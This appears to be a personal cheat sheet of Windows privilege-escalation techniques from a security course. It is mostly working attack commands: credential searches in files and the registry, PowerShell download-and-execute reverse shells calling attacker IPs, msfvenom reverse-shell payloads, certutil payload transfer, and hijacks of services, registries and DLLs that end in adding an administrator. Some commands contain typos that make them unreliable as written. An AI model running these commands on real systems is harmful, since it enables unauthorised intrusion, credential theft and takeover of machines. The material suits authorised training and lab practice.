# Systeminfo


quick systeminfo to grab system name version and type
```
systeminfo | findstr B/ /C:"OS Name" /C:"OS Version" /CLSystem Type"

```

# Hotfixes

```
wmic qfe # find hotfixes installed
wmic gfe get Caption,Description,HotFixID,InstalledOn # cleaner view
```

# List drives

```
wmic logicaldisk get caption,descriptiom.providername # list drives
wmic logicaldisk get caption # cleaner listing
```

# user enum

```
whoami /priv # check user privs
whoami /groups # check groups
net user # check users
net user babis # check user named babis info 
net localgroup # check groups
net localgroup administrators ## check group named administrator 
```

# Network

```
ipconfig /all # check network info
arp -a # check arp table 
route print # check routes
netstat -ano # # open ports
```

# Passwords

```
findstr /si password *.txt # search for files with rod password
findstr /si password *.txt *.ini *.config # search for files with rod password
```

# AV

```
sc query windefend # check windows defender 
sc queryex type= service # all services running 
```

# firewall

```
netsh advfirewall firewall dump 
netsh firewall show state
netsh firewall show config
```

# Registry
```
reg query HKLM /f password /t REG_SZ /s
```
 
# Search
`/R C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default logins.json`
```
where /R c:\windows bash # search for bash in windows
find
cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata # find files owned by user chase

gci -recurse . | select fullname # list all files recursively 


# flags
/R # recursive 
```

# Turn file into base64
```
[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))
```

# Running commands as another user

First we create a virable and add creds to it 

```
$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<user>',$SecPass)

# grap reverse shell with powershell
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadstring('http://10.10.16.2/shell.ps1')" -Credential $cred
```

# Powerup.ps1

```
Invoke-AllChecks  # check for privesc

```

# Run as / saved creds

Identifying stored  credentials

```
cmdkey /list # search for stored creds

runas /savecred /user:WORKGROUP\User "Program to execute" # run program as another user

# flags

/savecred # use saved cred
/user # user workgroup and name

```

## encoding 
convert powershell command to UTF-16LE 

```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0 # encode on attacker machine

# on target
runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand" <encoded string>

```
## dpapi creds

 [good write-up on this](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)

# Autoruns
As the path to the autorun can be modified, we replace the file with our payload. To execute it with elevated privileges we need to wait for someone in the Admin group to login.


generate payload
``
`msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`

Replace program.exe with the autorun program 

#  Registry Escalation - AlwaysInstallElevated

Windows can allow low privilege users to install a Microsoft Windows Installer Package (MSI) with system privileges by the AlwaysInstallElevated group policy.

## Detection

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## example

Generate .msi payload using msfvenom

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o shell.msi`
Transfer file to the target using certutil
`certutil -urlcache -f http://10.10.10.10/shell.msi shell.msi`
Run listener
`nc -lvnp 443`
The following command can then be used to install the .msi file:

```
msiexec /quiet /qn /i file.msi

# flags
-   /quiet # quiet mode, which means there’s no user interaction required
-   /qn # specifies there’s no UI during the installation process
-   Specifies normal installation
```


# Weak Registry Permission

In Windows, services have a registry keys and those keys are located at: `HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`

If **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.

## Detection

1. Open powershell prompt and type:
`Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`

2. Notice that the output suggests that user belong to
`“NT AUTHORITY\INTERACTIVE”`  has “FullContol” permission over the registry key.`

![[Pasted image 20230112221435.png]]


## Exploitation
Modify the `ImagePath` key of the registry to your payload path and restart the service.

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f

# restart service
sc start regsvc
```


# Weak Folder Permissions

If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

## Detection

![[Pasted image 20230112222839.png]]
 Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
 
## Exploitation 

Generate msfvenom payload and upload it to the target then Replacing the file by copying the payload to the service binary location. Restart the service to execute the payload with higher privilege.

```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

#  Weak Service Permissions

If the group “Authenticated users” has **SERVICE_ALL_ACCESS** in a service, then it can modify the binary that is being executed by the service.
check for it by using
```
cmd.exe /c "sc qc UsoSvc" # powershell
sc qc UsoSvc # cmd
```

![[Pasted image 20230112223213.png]]

Generate msfvenom payload

`msfvenom -p windows/shell_reverse_tcp LPORT=9001 LHOST=<kali ip> -f exe-service > shell.exe`


When Windows makes a call to start a service, it calls the ServiceMain function and expects a return from this call. If you don’t specify exe-service, the generated payload won’t be able to give you a persistent shell.

Modify the config using and start the service to execute the payload.

`sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"`

![[Pasted image 20230112223413.png]]


# Startup Applications


# DLL Hijacking

A windows program looks for DLLs when it starts. If these DLL’s do not exist then it is possible to escalate privileges by placing a malicious DLL in the location where the application is looking for.

Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in a specific order.

1. The directory from which the application loaded  
2. 32-bit System directory (C:\Windows\System32)  
3. 16-bit System directory (C:\Windows\System)  
4. Windows directory (C:\Windows)  
5. The current working directory (CWD)  
6. Directories in the PATH environment variable (first system and then user)

PowerUp has detected a potential DLL hijacking vulnerability.

![[Pasted image 20230113001753.png]]
And we can use Write-HijackDll function using PowerUp

`Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'`
then restart the service
```
sc stop <service>
sc start <service>
```

# Binary paths

![[Pasted image 20230119015514.png]]
If user has permission to change service config attacker can inject malicious code inside the path 

```
sc config daclsvc binpath= "net localgroup administrators user /add"
# add the user user to administrators
sc start daclsvc
```

## Unquoted service path
when a service image path has spaces in it's name and not secured using quotes  attackers can inject malicious program that is named similar to the service path and will get executed when service is started 

Example:
![[Pasted image 20230119020013.png]]
In this example program unqotedpathservice.exe Image path isn't quoted if attacker has write permision in any of the directories path to the program he can leverage it 
creating a reverse shell with the name common and will place it inside `\Unqouted Path Service`
```
msfvenom  -e x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.17.185 LPORT=1337 -f exe -o Common.exe
```





---
Tags: #tcm-security #Windows_priv_esc 
Resources:
[Github windows privesc repo](https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources)